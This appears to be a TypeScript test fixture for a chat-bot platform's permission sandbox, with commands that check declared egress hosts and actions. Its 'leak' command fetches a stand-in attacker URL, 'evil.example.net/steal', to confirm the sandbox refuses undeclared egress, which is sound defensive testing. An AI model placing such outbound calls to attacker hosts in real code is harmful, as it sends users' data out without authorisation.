import { app, RefusedError } from "@pollis/app";

export default app({
  manifest: {
    read: { channels: ["#support"], history: 7, events: ["created", "edited"] },
    actions: ["post", "reply", "react"],
    state: { quota: 1024 },
    egress: ["api.example.com"],
    commands: [
      { name: "count", description: "Count up" },
      { name: "ticket", description: "File a ticket", arg_hint: "<title>" },
      { name: "leak", description: "Try an undeclared host" },
      { name: "edit", description: "Try an undeclared action" },
      { name: "history", description: "Read history" },
      { name: "random", description: "Roll" },
      { name: "throw", description: "Fail" },
      { name: "other", description: "Falls through" },
    ],
    schedules: [{ name: "daily", every: 86400, offset: 32400 }],
  },

  async onCommand(cmd, ctx) {
    switch (cmd.name) {
      case "count": {
        const n = ((await ctx.state.getJSON<number>("count")) ?? 0) + 1;
        await ctx.state.setJSON("count", n);
        await ctx.reply(cmd.message, `count is ${n}`);
        return;
      }
      case "ticket": {
        const res = await ctx.fetch("https://api.example.com/tickets", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ title: cmd.args }),
        });
        const body = await res.json<{ id: string }>();
        await ctx.reply(cmd.message, `Filed ${body.id} (${res.status}, ${res.headers.get("x-kind")})`);
        return;
      }
      case "leak": {
        try {
          await ctx.fetch("https://evil.example.net/steal");
        } catch (e) {
          await ctx.reply(cmd.message, e instanceof RefusedError ? `refused: ${e.message}` : `other: ${String(e)}`);
        }
        return;
      }
      case "edit":
        // Not in `actions`: the refusal rejects, the handler throws, nothing is sent.
        await ctx.reply(cmd.message, "this reply is discarded");
        await ctx.editOwn(cmd.message, "nope");
        return;
      case "history": {
        const found = await ctx.messages({ limit: 10 });
        await ctx.reply(cmd.message, found.map((m) => m.text).join(" | "));
        return;
      }
      case "random": {
        const bytes = new Uint8Array(8);
        crypto.getRandomValues(bytes);
        ctx.log.info(`random ${Math.random()} ${Array.from(bytes).join(",")}`);
        console.log("hello from console.log");
        await ctx.react(cmd.message, "🎲");
        return;
      }
      case "throw":
        throw new Error("something broke");
      default:
        await ctx.post(cmd.message.channel, `unknown command ${cmd.name}`);
    }
  },

  async onMessage(message, ctx) {
    if (message.text.includes("help")) {
      await ctx.reply(message, "Try /ticket");
    }
  },

  async onMention(message, ctx) {
    await ctx.reply(message, "you rang");
  },

  async onSchedule(schedule, ctx) {
    ctx.log.info(`schedule ${schedule.name} at ${new Date(schedule.slot).toISOString()} now ${ctx.now()}`);
  },

  async onWebhook(webhook, ctx) {
    const type = webhook.headers.find(([k]) => k === "content-type")?.[1];
    ctx.log.info(`webhook ${type}`);
    const event = webhook.json<{ text: string; channel: string }>();
    await ctx.post(event.channel, event.text);
  },
});
